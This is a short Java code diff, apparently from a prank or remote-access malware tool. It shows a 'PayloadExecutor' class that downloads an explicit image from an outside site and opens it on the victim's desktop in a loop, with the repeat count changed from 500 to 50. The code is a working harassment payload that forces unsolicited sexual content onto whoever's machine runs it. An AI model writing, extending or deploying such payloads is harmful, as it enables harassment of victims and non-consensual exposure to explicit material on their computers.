@@ -23,7 +23,7 @@ public class FurryPorn implements PayloadExecutor {
     public void execute() throws Exception {
         fileUtil.downloadFile("https://static1.e621.net/data/sample/93/68/9368cca139a855bd2d1322fab98d84e8.jpg", path);
 
-        for(int i = 0; i < 500; i++) {
+        for(int i = 0; i < 50; i++) {
             try {
                 Desktop.getDesktop().open(path);
             }
